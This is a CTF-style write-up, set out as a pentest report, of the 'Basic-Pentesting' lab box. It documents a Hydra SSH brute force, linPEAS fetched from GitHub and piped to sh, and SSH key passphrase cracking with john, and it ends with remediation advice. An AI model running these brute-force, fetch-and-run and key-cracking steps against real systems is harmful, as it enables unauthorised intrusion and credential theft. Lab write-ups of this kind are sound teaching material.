# Basic-Pentesting — CTF Writeup — Exploiting Weak Credentials and Privilege Escalation

## 1. Engagement Overview
- **Title / Project Name:** Basic-Pentesting (CTF room)
- **Author:** 0xBlood
- **Date:** Old
- **Objective:** Obtain user and final flags by exploiting weak SSH credentials and performing privilege escalation via harvested SSH private key.
- **Scope / Target:** `10.201.123.193`
- **Testing Window:** CTF box
- **Tools Used:** nmap, gobuster, enum4linux, hydra, ssh, linPEAS, john (ssh2john), basic unix utilities
- **Methodology Reference:** Recon → Enumeration → Exploitation → Post-exploitation → Cleanup

## 2. Short Summary
Enumerated network and application services (SSH, HTTP, SMB). Discovered a developer hint on the web server suggesting a weak password for user `j`/`jan`. SMB enumeration revealed local users including `jan` and `kay`. Brute-forced `jan`'s SSH password using RockYou and gained a shell. Running linPEAS discovered an encrypted SSH private key for `kay`. Cracked the private key passphrase with John (wordlist: RockYou), used the key to SSH as `kay`, and retrieved the final flag from `kay`'s files.

## 3. Methodology / Process Flow

### 3.1 Reconnaissance
- Performed service/version scans to identify open ports and services.
- Identified web, SSH, and SMB services for further enumeration.

**Commands**
```
nmap -sC -sV 10.201.123.193
```

**Key output (summary)**
- `22/tcp` — ssh
- `80/tcp` — http
- `139/tcp`, `445/tcp` — SMB (microsoft-ds)
- `8009/tcp` — ajp13
- `8080/tcp` — http-proxy

### 3.2 Enumeration
- Web directory enumeration uncovered `/development/` which contained developer notes hinting user `j` had a weak password.
- SMB enumeration with `enum4linux` listed local users: `kay`, `jan`, `ubuntu` — indicating potential system accounts to target.

**Commands**
```
gobuster dir -u http://10.201.123.193 -w /usr/share/wordlists/dirb/common.txt
enum4linux -a 10.201.123.193
```

**Important findings**
- `/development/` directory with developer notes indicating weak password for `j`.
- SMB users: `kay`, `jan`, `ubuntu` (from SID listings).

### 3.3 Exploitation
- Used Hydra to brute-force SSH for user `jan` with RockYou wordlist; recovered password `armando`.
- SSH into machine as `jan` to obtain initial shell.

**Commands / results**
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.201.123.193 -t 4
# found: jan:armando
ssh jan@10.201.123.193
```

### 3.4 Post-Exploitation (Privilege Escalation Enumeration)
- Performed local enumeration and ran linPEAS to find escalation vectors.
- linPEAS revealed an encrypted SSH private key (`id_rsa`) belonging to user `kay`.
- Converted the SSH key to a John-compatible hash and cracked the passphrase using RockYou (`beeswax`).

**Commands**
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# found encrypted id_rsa in kay's home
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
# cracked passphrase: beeswax
```

### 3.5 Exploitation — Access as Kay
- Used the decrypted private key to SSH as `kay`:
```
ssh -i id_rsa kay@10.201.123.193
```
- Located `pass.bak` in kay's directory which contained the final flag:
```
cat pass.bak
# => final flag
```

### 3.6 Persistence / Cleanup
- Removed any transferred tools and temporary files used for enumeration/cracking where appropriate.
- Documented actions taken during the engagement.

## 4. Findings Summary
| ID | Vulnerability / Issue | Severity | Impact | Recommendation |
|----|------------------------|----------:|--------|----------------|
| 1 | Developer notes exposing hints in web directory (`/development/`) | Medium | Information disclosure facilitating targeted attacks | Remove sensitive developer notes from public web directories; use access controls for development resources |
| 2 | Weak SSH password for `jan` (`armando`) | High | Unauthorized access via credential guessing | Enforce strong password policies, account lockout, and MFA; rotate compromised credentials |
| 3 | Encrypted SSH private key discovered for `kay` | High | Credential harvesting enabling lateral movement | Protect private keys; restrict access to key files; use passphrases and store keys securely (e.g., agent or hardware-backed) |
| 4 | Cracked passphrase from weak wordlist-based cracking | High | Escalation to another user leading to final flag | Use strong, unique passphrases for keys and consider key encryption with secure passphrases; monitor for the presence of private keys on hosts |

## 5. Technical Details

### Finding 1 — Developer notes revealing potential target
- **Description:** Developer notes in `/development/` suggested a weak password for a user, guiding focused brute force attempts.
- **Impact:** Reduced attack surface for brute forcing by indicating which username to target.
- **Evidence (commands / outputs):**
  - `gobuster` found `/development/`.
  - Developer note referenced user `j` with weak password hint.
- **Recommendation:** Remove development artifacts from production; restrict access to development directories and use environment-specific configurations.

### Finding 2 — Weak credentials discovered via brute-force
- **Description:** SSH brute force against `jan` with RockYou recovered `armando`.
- **Impact:** Unauthorized shell access as `jan` enabling further enumeration.
- **Evidence (commands / outputs):**
  - `hydra` run and successful credential: `jan:armando`.
  - SSH login as `jan` successful.
- **Recommendation:** Enforce robust password policies, MFA, and monitor failed login attempts; consider rate-limiting and account lockouts.

### Finding 3 — Encrypted SSH key and passphrase cracking
- **Description:** Found encrypted `id_rsa` for user `kay`, converted for John, and cracked passphrase (`beeswax`) using RockYou wordlist.
- **Impact:** Allowed lateral movement to `kay` and access to sensitive files.
- **Evidence (commands / outputs):**
  - `ssh2john id_rsa > id_rsa.hash`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash` -> `beeswax`
  - `ssh -i id_rsa kay@10.201.123.193` -> access
- **Recommendation:** Enforce key management best practices: strong passphrases, limited file permissions, use SSH agents, and rotate keys regularly.

## 6. Remediation Plan
- **High Priority:** Enforce strong password policies and enable MFA for user accounts; rotate compromised credentials immediately.
- **High Priority:** Remove sensitive development notes from public web servers and restrict access to development resources.
- **High Priority:** Secure key storage and enforce strict permissions on private keys; monitor for presence of private keys in user directories.
- **Medium Priority:** Implement monitoring and alerting for brute-force attempts and unusual SSH activity.
- **Low Priority:** Conduct regular internal audits for exposed secrets and developer artifacts.

## 7. Appendices
**Tool outputs / commands used**
```
# Recon
nmap -sC -sV 10.201.123.193

# Web enumeration
gobuster dir -u http://10.201.123.193 -w /usr/share/wordlists/dirb/common.txt

# SMB enumeration
enum4linux -a 10.201.123.193

# SSH brute force
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.201.123.193 -t 4

# linPEAS + key cracking
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# SSH as kay
ssh -i id_rsa kay@10.201.123.193
cat pass.bak

# Cleanup
rm id_rsa id_rsa.hash /tmp/linpeas.sh
```

---
